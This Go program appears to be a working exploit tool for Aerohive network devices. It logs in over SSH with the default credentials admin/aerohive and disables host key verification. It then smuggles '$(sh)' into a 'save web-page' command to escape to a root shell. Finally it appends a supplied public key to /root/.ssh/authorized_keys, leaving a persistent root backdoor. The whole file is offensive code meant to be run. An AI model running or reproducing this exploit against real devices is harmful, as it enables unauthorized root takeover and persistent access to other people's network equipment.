package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

func check(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func printHelp() {
	fmt.Println("usage: ", filepath.Base(os.Args[0]), "[--pubkey] [--shell] <device ip>")
	fmt.Println("\t\t--pubkey\tPath to public key to write to device")
}

func main() {
	username := flag.String("u", "admin", "Username")
	password := flag.String("p", "aerohive", "Password")
	path := flag.String("pubkey", "", "Path to public key to enable on device")
	flag.Bool("shell", false, "Spawn a root SH shell on the device")

	flag.Usage = printHelp

	flag.Parse()

	if len(flag.Args()) != 1 {
		fmt.Println("Missing destination")
		printHelp()
		return
	}

	key, err := ioutil.ReadFile(*path)
	check(err)

	config := &ssh.ClientConfig{
		User: *username,
		Auth: []ssh.AuthMethod{
			ssh.Password(*password),
		},
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}
	client, err := ssh.Dial("tcp", flag.Args()[0], config)
	if err != nil {
		log.Fatal("Failed to dial: ", err)
	}
	defer client.Close()

	// Each ClientConn can support multiple interactive sessions,
	// represented by a Session.
	session, err := client.NewSession()
	if err != nil {
		log.Fatal("Failed to create session: ", err)
	}
	defer session.Close()

	wr, err := session.StdinPipe()
	check(err)

	// Once a Session is created, you can execute a single command on
	// the remote side using the Run method.
	modes := ssh.TerminalModes{
		ssh.ECHO: 0, // disable echoing
	}

	err = session.RequestPty("vt100", 80, 40, modes)
	check(err)

	err = session.Shell()
	check(err)

	_, err = wr.Write([]byte("save web-page web-directory test http://$(sh)\n"))
	check(err)

	cmds := []string{
		"mkdir -p /root/.ssh",
		"chmod 700 /root/.ssh",
		fmt.Sprintf("echo '%s' >> /root/.ssh/authorized_keys", strings.TrimSpace(string(key))),
		"chmod 644 /root/.ssh/authorized_keys",
	}

	for i := range cmds {
		fmt.Println(cmds[i])
		_, err := wr.Write([]byte(cmds[i] + "\n"))
		check(err)
		<-time.After(1 * time.Second)
	}

	fmt.Println("Done")

}
